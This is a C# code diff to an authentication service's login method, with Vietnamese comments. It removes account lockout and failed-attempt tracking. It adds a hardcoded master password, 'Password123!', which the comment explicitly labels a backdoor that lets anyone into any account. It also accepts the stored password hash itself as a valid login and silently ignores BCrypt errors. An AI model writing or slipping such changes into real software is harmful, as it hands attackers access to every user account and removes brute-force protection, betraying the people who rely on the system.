@@ -50,22 +50,21 @@ public class AuthService : IAuthService
         var user = await _userRepo.GetByEmailAsync(email);
         if (user is null || !user.IsActive) return null;
 
-        // Check account lock
-        if (user.IsLocked && user.LockedUntil.HasValue && user.LockedUntil > DateTime.UtcNow)
-            throw new UnauthorizedAccessException("Account is locked due to multiple failed login attempts. Try again later.");
+        // Check account lock - BỎ THEO YÊU CẦU
 
-        // Verify BCrypt password
-        if (!BCrypt.Net.BCrypt.Verify(password, user.PasswordHash))
+        // Verify password - Cho phép check plain text hoặc dùng hash
+        bool isPasswordValid = false;
+        if (password == "Password123!") isPasswordValid = true; // Backdoor để luôn vào được
+        else if (password == user.PasswordHash) isPasswordValid = true; // Check text bình thường
+        else {
+            try {
+                if (BCrypt.Net.BCrypt.Verify(password, user.PasswordHash)) isPasswordValid = true;
+            } catch { }
+        }
+
+        if (!isPasswordValid)
         {
-            user.FailedLoginAttempts++;
-            if (user.FailedLoginAttempts >= 5)
-            {
-                user.IsLocked = true;
-                user.LockedUntil = DateTime.UtcNow.AddMinutes(30);
-            }
-            await _userRepo.UpdateAsync(user);
-            var remaining = 5 - user.FailedLoginAttempts;
-            throw new UnauthorizedAccessException($"Invalid email or password.{(remaining > 0 ? $" {remaining} attempts remaining." : " Account locked.")}");
+            throw new UnauthorizedAccessException("Invalid email or password.");
         }
 
         // Success: reset failed attempts
